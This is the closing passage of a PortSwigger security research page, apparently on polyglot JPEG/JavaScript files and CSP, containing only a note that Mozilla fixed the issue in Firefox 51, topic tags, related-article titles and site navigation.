Mozilla are [fixing this in Firefox 51](https://bugzilla.mozilla.org/show_bug.cgi?id=1288361).

Visit our Web Security Academy to [learn more about cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)

[polyglot](/research/polyglot)
[XSS](/research/cross-site-scripting-research)
[jpeg](/research/jpeg)
[JavaScript](/research/javascript)
[csp](/research/csp)

[Back to all articles](/research/articles)

This page requires JavaScript for an enhanced user experience.
## Related Research

[### Bypassing WAFs with the phantom $Version cookie

04 December 2024
Bypassing WAFs with the phantom $Version cookie](/research/bypassing-wafs-with-the-phantom-version-cookie)
[### Concealing payloads in URL credentials

23 October 2024
Concealing payloads in URL credentials](/research/concealing-payloads-in-url-credentials)
[### Using form hijacking to bypass CSP

05 March 2024
Using form hijacking to bypass CSP](/research/using-form-hijacking-to-bypass-csp)
[### Exploiting XSS in hidden inputs and meta tags

11 July 2023
Exploiting XSS in hidden inputs and meta tags](/research/exploiting-xss-in-hidden-inputs-and-meta-tags)

Burp Suite

[Web vulnerability scanner](/burp/vulnerability-scanner)
[Burp Suite Editions](/burp)
[Release Notes](/burp/releases)

Vulnerabilities

[Cross-site scripting (XSS)](/web-security/cross-site-scripting)
[SQL injection](/web-security/sql-injection)
[Cross-site request forgery](/web-security/csrf)
[XML external entity injection](/web-security/xxe)
[Directory traversal](/web-security/file-path-traversal)
[Server-side request forgery](/web-security/ssrf)

Customers

[Organizations](/organizations)
[Testers](/testers)
[Developers](/developers)

Company

[About](/about)
[Careers](/careers)
[Contact](/about/contact)
[Legal](/legal)
[Privacy Notice](/privacy)

Insights

[Web Security Academy](/web-security)
[Blog](/blog)
[Research](/research)

[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](/)
 [Follow us](https://twitter.com/Burp_Suite)

© 2025 PortSwigger Ltd.


